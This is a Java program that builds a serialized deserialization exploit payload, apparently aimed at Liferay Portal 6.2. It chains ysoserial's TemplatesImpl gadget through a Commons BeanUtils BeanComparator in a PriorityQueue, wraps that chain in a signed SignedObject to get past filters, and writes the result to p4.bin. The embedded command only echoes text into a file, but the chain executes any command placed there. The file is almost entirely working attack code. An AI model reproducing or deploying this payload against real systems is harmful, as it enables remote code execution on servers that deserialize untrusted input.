import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.apache.xalan.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.ecs.wml.P;
import ysoserial.payloads.util.Reflections;


import javax.xml.transform.Templates;
import java.io.BufferedWriter;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.security.*;
import java.util.*;

public class Main {
    public static void main(String[] args) throws Exception {
        // Generate payload bytes
        String [] commands = { "bash", "-c", "echo hello > hello.txt" };
        Object obj = Gadgets.createTemplatesImpl("echo hello > E:\\liferay-portal-jboss-6.2-ce-ga3-20150103155803016\\liferay-portal-6.2-ce-ga3\\abc.txt");

        PriorityQueue queue1 = getpayload(obj, "outputProperties");
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\PBUG\\Documents\\JavaVer\\p4.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fileOutputStream);
        oos.writeObject(queue2);
        oos.close();
    }
    public static PriorityQueue<Object> getpayload(Object object, String string) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        Reflections.setFieldValue(beanComparator, "property", string);
        Reflections.setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }
}
